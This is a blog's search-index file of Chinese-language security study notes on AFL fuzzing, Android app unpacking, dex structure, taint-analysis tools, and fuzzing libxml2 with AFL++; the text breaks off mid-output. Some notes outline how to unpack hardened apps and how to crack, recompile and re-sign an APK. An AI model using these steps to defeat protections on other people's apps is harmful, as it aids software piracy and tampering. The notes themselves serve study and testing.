<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AFL fuzz whitepaper</title>
    <url>/2021/11/08/AFL-fuzz-whitepaper/</url>
    <content><![CDATA[<h1 id="Technical-“whitepaper”-for-afl-fuzz"><a href="#Technical-“whitepaper”-for-afl-fuzz" class="headerlink" title="Technical “whitepaper” for afl-fuzz"></a>Technical “whitepaper” for afl-fuzz</h1><h2 id="Design-statement"><a href="#Design-statement" class="headerlink" title="Design statement"></a>Design statement</h2><p>该工具可以被认为是黑客的集合（可以在实际中测试），是有效的，并且是已实现的，最健壮的工具。</p>
<p>原则：速度、可靠性、易使用</p>
<span id="more"></span>

<h2 id="Coverage-measurements"><a href="#Coverage-measurements" class="headerlink" title="Coverage measurements"></a>Coverage measurements</h2><p>这个插桩注入到编译好的程序来获取分支覆盖率</p>
<p>注入点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; 1;</span><br></pre></td></tr></table></figure>

<p>cur_location是随机生成来简化链接复杂项目的并且保持XOR输出均匀分布。</p>
<p>shared_mem[]是64KB的一个共享内存区域，被调用者传递给插桩二进制</p>
<p>输出映射中设置的每个字节都可以看作是插入指令的代码中特定（branch_src，branch_dst）元组的命中</p>
<p>coverage的形式：元组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)</span><br><span class="line">A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)</span><br></pre></td></tr></table></figure>

<p>这有助于发现底层代码中的细微故障条件，因为安全漏洞通常与意外或不正确的状态转换相关，而不仅仅是与到达新的基本块相关。</p>
<h2 id="Detecting-new-behaviors"><a href="#Detecting-new-behaviors" class="headerlink" title="Detecting new behaviors"></a>Detecting new behaviors</h2><p>fuzzer维护在以前的执行中看到的元组的全局映射，可以与单路径进行快速比较，并且使用简单的循环和几条简单的之类就可以进行更新。</p>
<p>当一个变异之后的输入的执行路径包含新的元组的时候，该输入便会被保留下来。否则将会被丢弃，即使他们的控制流图是唯一的。</p>
<p>这种方法允许对程序状态进行非常细粒度和长期的探索，而不必对复杂的执行跟踪执行任何计算密集和脆弱的全局比较，同时避免了路径爆炸。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1: A -&gt; B -&gt; C -&gt; D -&gt; E</span><br><span class="line">#2: A -&gt; B -&gt; C -&gt; A -&gt; E</span><br><span class="line">#2包含了新的元组（CA, AE），所以他是新的</span><br><span class="line">#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E</span><br><span class="line">但是#3不是unique的</span><br></pre></td></tr></table></figure>

<p>此外除了考虑新的元组外，AFL还粗略统计了到达的元组数目，他们被分到下面的几个区间bucket：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+</span><br></pre></td></tr></table></figure>

<p>bucket的数量是一个实现工件：它允许将插装生成的8位计数器就地映射到fuzzer可执行文件依赖的8位位图，以跟踪每个元组已经看到的执行计数。bucket之内的变化会被忽略。</p>
<h2 id="Evolving-the-input-queue"><a href="#Evolving-the-input-queue" class="headerlink" title="Evolving the input queue"></a>Evolving the input queue</h2><p>已经变异了的测试用例，如果产生一个新的状态，就会被添加到输入队列中，并且作为将来的fuzzing的一个开始点。</p>
<p>这个方法主要是为了让AFL探索分散的和尽可能多不可比的数据格式特点。</p>
<h2 id="Culling-the-corpus"><a href="#Culling-the-corpus" class="headerlink" title="Culling the corpus"></a>Culling the corpus</h2><p>AFL为了保证效率，AFL会定期重新评估输入队列，选出测试用例的一个子集，同时可以保证任然可以覆盖每个元组。</p>
<p>算法原理：为每个队列分配一个于其执行文件大小成比例的分数，然后为每个元组选择得分最低的候选项。</p>
<p>元组的处理流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Find next tuple not yet in the temporary working set,</span><br><span class="line"></span><br><span class="line">2) Locate the winning queue entry for this tuple,</span><br><span class="line"></span><br><span class="line">3) Register *all* tuples present in that entry&#x27;s trace in the working set,</span><br><span class="line"></span><br><span class="line">4) Go to #1 if there are any missing tuples in the set.</span><br></pre></td></tr></table></figure>

<p>被判断成favored的实体，通常比原始数据集小5-10倍。被判断成non-favored的实体不会被丢弃，只是当遇见的时候会有一定的概率跳过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- If there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.</span><br><span class="line"></span><br><span class="line">- If there are no new favorites:</span><br><span class="line"></span><br><span class="line">  - If the current non-favored entry was fuzzed before, it will be skipped 95% of the time.</span><br><span class="line"></span><br><span class="line">  - If it hasn&#x27;t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.</span><br></pre></td></tr></table></figure>

<p>this provides a reasonable balance between queue cycling speed and test case diversity.</p>
<p>afl-cmin: 稍微有点复杂，但是更慢的一个缩减方法。</p>
<h2 id="Trimming-input-files"><a href="#Trimming-input-files" class="headerlink" title="Trimming input files"></a>Trimming input files</h2><p>有些类型的变异策略可能会迭代增加生成文件的大小。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trimmer </span><br></pre></td></tr></table></figure>

<p>afl-tmin：是独立运行的，使用更详尽的迭代算法，还尝试对修剪过的文件执行字母表规范化。</p>
<p>他的操作如下：</p>
<ul>
<li>首先，这个工具自动选择工作模式。如果初始化输入让目标二进制文件崩溃，afl-min将会使用未插桩的模式，并且简单对输入进行调整（产生更加简单的文件，但是任然是可以产生crash）；如果目标没有崩溃，他就会使用插桩的模式，并且保持调整（产生同样的执行路径）。</li>
</ul>
<p>实际的算法是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Attempt to zero large blocks of data with large stepovers. Empirically, this is shown to reduce the number of execs by preempting finer-grained efforts later on.</span><br><span class="line"></span><br><span class="line">2) Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style. </span><br><span class="line"></span><br><span class="line">3) Perform alphabet normalization by counting unique characters and trying to bulk-replace each with a zero value.</span><br><span class="line"></span><br><span class="line">4) As a last result, perform byte-by-byte normalization on non-zero bytes.</span><br><span class="line">- Sequential bit flips with varying lengths and stepovers,</span><br><span class="line"></span><br><span class="line">- Sequential addition and subtraction of small integers,</span><br><span class="line"></span><br><span class="line">- Sequential insertion of known interesting integers (0, 1, INT_MAX, etc),</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>AFL</tag>
        <tag>whitepaper</tag>
      </tags>
  </entry>
  <entry>
    <title>APP加壳脱壳学习笔记</title>
    <url>/2022/04/11/APP%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="APP壳相关知识"><a href="#APP壳相关知识" class="headerlink" title="APP壳相关知识"></a>APP壳相关知识</h1><p>app运行流程：</p>
<ol>
<li>BootClassLoader加载系统核心库</li>
<li>PathClassLoader加载 APP自身dex</li>
<li>进入APP自身组件开始执行</li>
<li>调用声明Application的 attachBaseContext</li>
<li>调用声明Application的onCreate</li>
</ol>
<p>app最先获得执行权限的是app中声明的Application类中的attachBaseContext和onCreate函数，所以壳对代码进行解密一般都在这两个函数上进行。</p>
<span id="more"></span>

<p><strong>加壳程序的运行流程：</strong></p>
<ol>
<li>app启动</li>
<li>自定义Application中 attachBaseContext的实现<ul>
<li>解密源程序</li>
<li>初始化自定义加载器类</li>
<li>反射设置LoadedApk中加载器对象为自定义加载器</li>
</ul>
</li>
<li>自定义Application中的onCreate方法实现、<ul>
<li>获取源程序中的Application名称</li>
<li>反射生成正确的Application对象</li>
<li>反射设置ActivityThread中的Application信息</li>
</ul>
</li>
<li>Activity加载流程：源程序正常运行</li>
</ol>
<p>当壳在函数attachBaseContext和onCreate中执行完加密的dex文件的解密后，通过自定义的Classloader在内存中加载解密后的dex文件</p>
<p>只要获取到加固应用最终通过反射设置后的Classloader，我们就可以通过一系列反射最终获取到当前应用所加载的解密后的内存中的Dex文件。</p>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://bbs.pediy.com/thread-252630.htm">https://bbs.pediy.com/thread-252630.htm</a></p>
<p>Android源码：<a href="http://aospxref.com/">http://aospxref.com/</a></p>
]]></content>
      <categories>
        <category>Android security</category>
        <category>notes</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>加壳脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 存储相关信息</title>
    <url>/2022/03/23/Android-%E5%AD%98%E5%82%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h1 id="从物理结构上来区分："><a href="#从物理结构上来区分：" class="headerlink" title="从物理结构上来区分："></a>从物理结构上来区分：</h1><ul>
<li>Android 4.4<ul>
<li>内部存储 internal storage</li>
<li>外部存储 external storage （sdCard）</li>
</ul>
</li>
<li>Android 4.4以上<ul>
<li>手机自身存储结构<ul>
<li>内部存储 internal storage</li>
<li>内置的外部存储</li>
</ul>
</li>
<li>外部存储 external storage （sdCard）<span id="more"></span></li>
</ul>
</li>
</ul>
<h1 id="internal-storage"><a href="#internal-storage" class="headerlink" title="internal storage"></a>internal storage</h1><ul>
<li>app目录：手机已安装的app的apk存放目录</li>
<li>data目录：是各个APP存放自己私有数据的位置：shared preference, sqlite, cach。这些数据别人无法访问</li>
</ul>
<h1 id="external-storage"><a href="#external-storage" class="headerlink" title="external storage"></a>external storage</h1><ul>
<li>data目录：存放非系统app的对应包名的数据，也是私有数据。</li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>存储 内存</tag>
      </tags>
  </entry>
  <entry>
    <title>Android软件安全权威指南-学习笔记</title>
    <url>/2022/04/13/Android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="逆向一个app的常规步骤"><a href="#逆向一个app的常规步骤" class="headerlink" title="逆向一个app的常规步骤"></a>逆向一个app的常规步骤</h1><ol>
<li><p>使用apktool反编译apk</p>
<ul>
<li>Apktool_2.6.1.jar d app-release.apk -o outputdir</li>
</ul>
</li>
<li><p>查看资源文件中的string.xml</p>
</li>
<li><p>寻找相关的字符串对应的id号</p>
</li>
<li><p>搜索整个反编译文件内容 id号</p>
</li>
<li><p>继续分析</p>
</li>
<li><p>找到smali文件，然后查看逻辑，并破解apk</p>
</li>
<li><p>回编译apk、签名</p>
</li>
<li><p>验证</p>
<span id="more"></span></li>
</ol>
<h1 id="dex文件结构"><a href="#dex文件结构" class="headerlink" title="dex文件结构"></a>dex文件结构</h1><p>dex文件是Android系统的可执行文件，默认小端字节序（Little-Endian：低位字节再内存的低地址）</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td>header</td>
<td align="center">dex文件头部，记录整个dex文件的相关属性（magic固定：64 65 78 0a 30 33 35 00）   总长：0x70</td>
</tr>
<tr>
<td>string_ids</td>
<td align="center">字符串数据索引，记录了每个字符串在数据区的偏移量</td>
</tr>
<tr>
<td>type_ids</td>
<td align="center">类似数据索引，记录了每个类型的字符串索引</td>
</tr>
<tr>
<td>proto_ids</td>
<td align="center">原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表</td>
</tr>
<tr>
<td>field_ids</td>
<td align="center">字段数据索引，记录了所属类，类型以及方法名</td>
</tr>
<tr>
<td>method_ids</td>
<td align="center">类方法索引，记录方法所属类名，方法声明以及方法名等信息</td>
</tr>
<tr>
<td>class_defs</td>
<td align="center">类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量</td>
</tr>
<tr>
<td>data</td>
<td align="center">数据区，保存了各个类的真是数据</td>
</tr>
</tbody></table>
<p>dex文件分析示例：</p>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220413185118.png" alt="图片分析示例"></p>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220413185509.png"></p>
<p>jar文件转成dex文件</p>
<img src="https://raw.githubusercontent.com/Dfault0/images/main/20220414154101.png" style="zoom:40%;" />



<p><strong>java虚拟机基于栈，Dalvik是基于寄存器</strong></p>
<h1 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h1><p>zygote是Android系统中所有进程的孵化器进程。</p>
<ul>
<li>zygote启动后，会先初始化Dalvik虚拟机，</li>
<li>再启动system_server进程并进入zygote模式，通过socket等候命令下达。</li>
<li>在执行一个Android应用程序的时候，system_server进程通过binder IPC方式将命令发送给zygote。</li>
<li>zygote收到命令之后通过fork其自身创建一个dalvik虚拟机实例来执行应用程序的入口函数，从而完成应用程序的启动过程。</li>
</ul>
<p><a href="https://juejin.cn/post/6844904116561379341">https://juejin.cn/post/6844904116561379341</a></p>
<ul>
<li>fp是arm的栈帧寄存器</li>
<li>dalvik寄存器命令方式：<ul>
<li>v命名法：一个函数使用了m个寄存器（每个寄存器32位），且有n个参数， 参数使用最后的n个寄存器，vm-n - this，v0-vm-n-1表示的是局部变量使用的</li>
<li>p命名法：函数中传入的参数从p0开始增加，其他的和v命名法一样</li>
</ul>
</li>
</ul>
<p><strong>dalvik字节码类型描述符</strong></p>
<table>
<thead>
<tr>
<th>语法</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>v</td>
<td>void</td>
</tr>
<tr>
<td>Z</td>
<td>bool</td>
</tr>
<tr>
<td>B</td>
<td>BYTE</td>
</tr>
<tr>
<td>S</td>
<td>SHORT</td>
</tr>
<tr>
<td>C</td>
<td>CHAR</td>
</tr>
<tr>
<td>I</td>
<td>INT</td>
</tr>
<tr>
<td>J</td>
<td>LONG</td>
</tr>
<tr>
<td>F</td>
<td>FLOAT</td>
</tr>
<tr>
<td>D</td>
<td>DOUBLE</td>
</tr>
<tr>
<td>L</td>
<td>JAVA类类型 可以表示Java中的任何类   Lpackage&#x2F;name.ObjectName; (package.name.ObjectName)</td>
</tr>
<tr>
<td>[</td>
<td>数组</td>
</tr>
</tbody></table>
<p>跳转指令：</p>
<ul>
<li>goto</li>
<li>switch</li>
<li>if</li>
</ul>
<p><u>dex文件的验证与校验：</u></p>
<ul>
<li><p>checksum：调用adler32()来完成计算，跳过了DexHeader的magic与checksum字段，将后面到文件的结果作为计算数据的总长度。</p>
</li>
<li><p>签名验证：跳过magic、checksum、signature字段，调用dexComputeSHA1Digest()，将计算结果与signature中保存的值进行比较，如果相等就通过</p>
</li>
</ul>
<h2 id="dex2jar使用"><a href="#dex2jar使用" class="headerlink" title="dex2jar使用"></a>dex2jar使用</h2><ul>
<li>下载 <a href="https://link.jianshu.com/?t=https://github.com/pxb1988/dex2jar">dex2jar</a>，并解压</li>
<li>下载class反编译工具 <a href="https://link.jianshu.com/?t=http://jd.benow.ca/">jd-gui</a>，并解压</li>
<li>将测试的安装包xxx.apk后缀改为.zip，解压后拷贝<code>classes.dex</code>文件到dex2jar文件目录下，cmd进入改目录，执行<code>d2j-dex2jar.bat classes.dex</code>命令，会生成classes-dex2jar.jar文件；</li>
<li>打开jd-gui工具，然后将生成的classes-dex2jar.jar文件拖进去，即可看见反编译的文件</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><p>Android安全面经：<a href="https://blog.xhyeax.com/2021/12/01/2022-autumn-mobile-security-interview-experience/">https://blog.xhyeax.com/2021/12/01/2022-autumn-mobile-security-interview-experience/</a></p>
</li>
<li><p>dex文件结构详解：<a href="https://www.jianshu.com/p/f7f0a712ddfe">https://www.jianshu.com/p/f7f0a712ddfe</a></p>
</li>
<li><p>dex文件结构图解：<a href="https://github.com/cckenny/2020_autumn_mobile_security_interview/blob/main/pics/DEX.png">https://github.com/cckenny/2020_autumn_mobile_security_interview/blob/main/pics/DEX.png</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>notes</category>
        <category>Android security</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>Android基础</title>
    <url>/2022/04/13/Android%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h1><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220413191810.png" style="zoom:40%;" />

<span id="more"></span>
]]></content>
      <categories>
        <category>Android</category>
        <category>notes</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>TaintAnalysis tools study</title>
    <url>/2022/03/24/TaintAnalysis-tools-study/</url>
    <content><![CDATA[<h1 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h1><p>sources and sinks</p>
<blockquote>
<p><strong>sources</strong>: the information we want to protect on a mobile device (e.g., phone number, contacts, location, and unique device identifiers) </p>
<p><strong>sinks</strong>: points of unwanted information release (e.g., methods related to the Internet and SMS transmission). </p>
<p>If data from a sensitive source reaches a sink, taint tracking identifies the path from the source to the sink as an instance of data leakage.</p>
</blockquote>
<span id="more"></span>

<h1 id="Flowdroid"><a href="#Flowdroid" class="headerlink" title="Flowdroid"></a>Flowdroid</h1><p>从2.0版本之后就可以处理ICC了</p>
<blockquote>
<p>使用这些污点分析工具的时候并不一定非要在源代码的基础上面修改，也可以直接使用他们的库，只要能够达到我的目的即可。</p>
</blockquote>
<p><a href="https://github.com/secure-software-engineering/FlowDroid">https://github.com/secure-software-engineering/FlowDroid</a></p>
<p>flowdroid采用保守策略 ，将框架分为四种：generation, exclude, kill, and default</p>
<ul>
<li>When method parameters (including the receiver object itself) or their fields are tainted, the methods in the <strong>generation</strong> type will have their receiver and the return value, as well as all their fields, tainted; no taint will be propagated for methods of the <strong>exclude</strong> type; </li>
<li>all taints will be removed for methods of the <strong>kill</strong> type. </li>
<li>If a method is not assigned with any of these types, the <strong>default</strong> rule will apply , propagating the taint<br>from the receiver object and its fields to the method return value and its fields. </li>
<li>That is, only for the methods in the <strong>generation</strong> type FLOWDROID will propagate the taint from method parameters and will taint the receiver parameter and its fields; it does not taint any other method parameters in any of the conservative strategies.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar \</span><br><span class="line">    -a &lt;APK File&gt; \</span><br><span class="line">    -p &lt;Android JAR folder&gt; \</span><br><span class="line">    -s &lt;SourcesSinks file&gt;</span><br></pre></td></tr></table></figure>

<p>本电脑的命令使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar soot-infoflow-cmd-2.9.0-jar-with-dependencies.jar -d -a D:\mobileForensics\apks\tests\app-realse.apk -p D:\android\android-platforms -s D:\mobileForensics\SourcesAndSinks.txt -o outputs -t</span><br></pre></td></tr></table></figure>

<p>java -jar soot-infoflow-cmd-2.9.0-jar-with-dependencies.jar -a D:\mobileForensics\Mixed -p D:\android\android-platforms -s D:\mobileForensics\SourcesAndSinks.txt -o .&#x2F;output</p>
<p>For FlowDroid can thus generate a main method in which every order of individual component lifecycles and callbacks is possible, it does not need to simulate all possible paths.</p>
<p><strong>In FlowDroid, only method calls can be the original source of a taint.</strong> </p>
<p>主要流程：</p>
<ol>
<li>解析文件</li>
<li>Next, FlowDroid generates the main method from the list of lifecycle and  callback methods (see the Paragraphs Callbacks and Substitution Classes for more  information). This main method is then used to generate a call graph and an  inter-procedural control-flow graph (ICFG). </li>
<li>Starting at the detected sources,  the taint analysis then tracks taints by traversing the ICFG as explained in  Section 4.</li>
<li>Native Calls require a special treatment which is described below along with a  performance optimization called Taint Wrapping. </li>
<li>At the end, FlowDroid reports  all discovered flows from sources to sinks.</li>
</ol>
<h1 id="Amandroid"><a href="#Amandroid" class="headerlink" title="Amandroid"></a>Amandroid</h1><p>支持native层，实现了一个流和上下文敏感的内部组件数据流分析。在一个过程间的控制流图和数据流图之上，为每一个组件构建一个数据依赖图，然后生成一个汇总表，记录可能的组件间通信连接。</p>
<p>不能处理隐式流。</p>
<ul>
<li>AMANDROID precisely models a subset of Android framework methods and applies a conservative strategy for the remaining ones. </li>
<li>Interestingly , AMANDROID’s strategy is different from that of FLOWDROID:<ul>
<li>in addition to the receiver object and the return value of a method, AMANDROID also taints all method parameters and their fields. </li>
<li>However, it is doing so only <strong>when the method receiver or parameters themselves</strong><br><strong>are tainted</strong>, not when one of their fields is tainted. </li>
<li>Strategies applied by both tools lead to false positive and false negative results, albeit in different cases, as we show in our evaluation.</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220418121650.png" alt="amdroid分析流程"></p>
<h1 id="静态分析工具的对比"><a href="#静态分析工具的对比" class="headerlink" title="静态分析工具的对比"></a>静态分析工具的对比</h1><p><img src="https://raw.githubusercontent.com/Dfault0/images/main/image-20220406161407676.png" alt="静态分析工具的对比"></p>
]]></content>
      <categories>
        <category>android security</category>
      </categories>
      <tags>
        <tag>taint analysis</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>afl fuzz libxml2</title>
    <url>/2021/11/05/afl-fuzz-libxml2/</url>
    <content><![CDATA[<p>模糊测试复现笔记</p>
<span id="more"></span>

<h1 id="使用AFL-模糊测试libxml2"><a href="#使用AFL-模糊测试libxml2" class="headerlink" title="使用AFL++模糊测试libxml2"></a>使用AFL++模糊测试libxml2</h1><h2 id="简单模糊测试"><a href="#简单模糊测试" class="headerlink" title="简单模糊测试"></a>简单模糊测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在这里的时候需要用绝对路径相对路径是会报错的。</span><br><span class="line">/home/fourth/fuzz</span><br><span class="line">$ make CC=/home/fourth/fuzz/AFLplusplus/afl-clang-fast CXX=/home/fourth/fuzz/AFLplusplus/afl-clang-fast++ LD=/home/fourth/fuzz/AFLplusplus/afl-clang-fast</span><br><span class="line"></span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i ./in -o ./out -m none -d -- ./xmlint_cov @@</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 3 min, 47 sec      │  cycles done : 0     │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 1 sec       │  total paths : 1710  │</span><br><span class="line">│ last uniq crash : none seen yet                     │ uniq crashes : 0     │</span><br><span class="line">│  last uniq hang : none seen yet                     │   uniq hangs : 0     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 1558.1 (91.1%)     │    map density : 1.00% / 4.98%      │</span><br><span class="line">│ paths timed out : 0 (0.00%)          │ count coverage : 3.23 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : havoc                  │ favored paths : 330 (19.30%)        │</span><br><span class="line">│ stage execs : 25.4k/32.8k (77.41%)   │  new edges on : 509 (29.77%)        │</span><br><span class="line">│ total execs : 1.24M                  │ total crashes : 0 (0 unique)        │</span><br><span class="line">│  exec speed : 5649/sec               │  total tmouts : 1 (1 unique)        │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 9         │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 1435      │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 109       │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 1707      │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 1173/890k, 526/285k                  │ stability : 96.68%    │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 18.12%/6877, disabled                │          [cpu000:150%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<h2 id="persistent-mode"><a href="#persistent-mode" class="headerlink" title="persistent mode"></a>persistent mode</h2><p>使用AFL++ 的persistent mode来加速fuzz</p>
<p>首先需要改写我们的主程序代码xmllint.c，其中带<code>+</code>的就是需要重新添加的。一般是循环10000次，是我自己少写了一个0，并且一般就是只需要修改的是main函数，然后把原来的main函数改一个名字即可。</p>
<p><code>__AFL_LOOP</code>就是告诉AFL，我们需要用到的是persistent mode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ diff -u a/xmllint.c b/xmllint.c &gt; ./b/diff.patch</span><br><span class="line"></span><br><span class="line">***@ubuntu:~/fuzz/libxml2$ <span class="built_in">cat</span> ./b/diff.patch</span><br><span class="line">--- a/xmllint.c	2021-11-08 18:20:14.461467630 -0800</span><br><span class="line">+++ b/xmllint.c	2021-11-08 19:01:45.680069687 -0800</span><br><span class="line">@@ -3131,7 +3131,13 @@</span><br><span class="line">     int files = 0;</span><br><span class="line">     int version = 0;</span><br><span class="line">     const char* indent;</span><br><span class="line">-</span><br><span class="line">+    </span><br><span class="line">+    <span class="keyword">if</span>(argc&lt;2)</span><br><span class="line">+    	<span class="built_in">return</span> 1;</span><br><span class="line">+    <span class="keyword">while</span>(__AFL_LOOP(1000))</span><br><span class="line">+    	parseAndPrintFile(argv[1],NULL);</span><br><span class="line">+    <span class="built_in">return</span> 0;</span><br><span class="line">+    </span><br><span class="line">     <span class="keyword">if</span> (argc &lt;= 1) &#123;</span><br><span class="line"> 	usage(stderr, argv[0]);</span><br><span class="line"> 	<span class="built_in">return</span>(1);</span><br><span class="line"> 一般是需要改成下面的这个样子的 	</span><br><span class="line">+int main(int argc, char** argv) &#123;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (argc &lt; 2) <span class="built_in">return</span> 1;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">while</span> (__AFL_LOOP(10000))</span><br><span class="line">+    parseAndPrintFile(argv[1], NULL);</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">return</span> 0;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> int</span><br><span class="line">-main(int argc, char **argv) &#123;</span><br><span class="line">+old_main(int argc, char **argv) &#123;</span><br><span class="line">     int i, acount;</span><br><span class="line">     int files = 0;</span><br><span class="line">     int version = 0;</span><br></pre></td></tr></table></figure>

<p>记住，在编译之前一定要先 <code>make clean</code> 否则会报错。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../fuzz</span><br><span class="line">$ <span class="built_in">rm</span> xmllint</span><br><span class="line">$ make CC=~/AFLplusplus/afl-clang-fast CXX=~/AFLplusplus/afl-clang-fast++ LD=~/AFLplusplus/afl-clang-fast</span><br><span class="line">$ <span class="built_in">cp</span> xmllint ../fuzz/xmllint_persistent</span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i <span class="keyword">in</span>/ -o out -m none -d -- ./xmllint_persistent @@</span><br></pre></td></tr></table></figure>

<p>可以看到模糊测试的速度大致提升了200倍。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">               american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 3 hrs, 22 min, 41 sec     │  cycles done : 3     │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 48 sec      │  total paths : 4212  │</span><br><span class="line">│ last uniq crash : none seen yet                     │ uniq crashes : 0     │</span><br><span class="line">│  last uniq hang : none seen yet                     │   uniq hangs : 0     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 2166.3 (51.4%)     │    map density : 1.34% / 6.66%      │</span><br><span class="line">│ paths timed out : 0 (0.00%)          │ count coverage : 4.38 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : havoc                  │ favored paths : 508 (12.06%)        │</span><br><span class="line">│ stage execs : 1212/5299 (22.87%)     │  new edges on : 863 (20.49%)        │</span><br><span class="line">│ total execs : 35.7M                  │ total crashes : 0 (0 unique)        │</span><br><span class="line">│  exec speed : 4039/sec               │  total tmouts : 2711 (233 unique)   │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 24        │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 2707      │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 0         │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 4209      │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 2467/16.6M, 1742/18.9M               │ stability : 97.27%    │</span><br><span class="line">│py/custom/rq : unused, unused, unused, 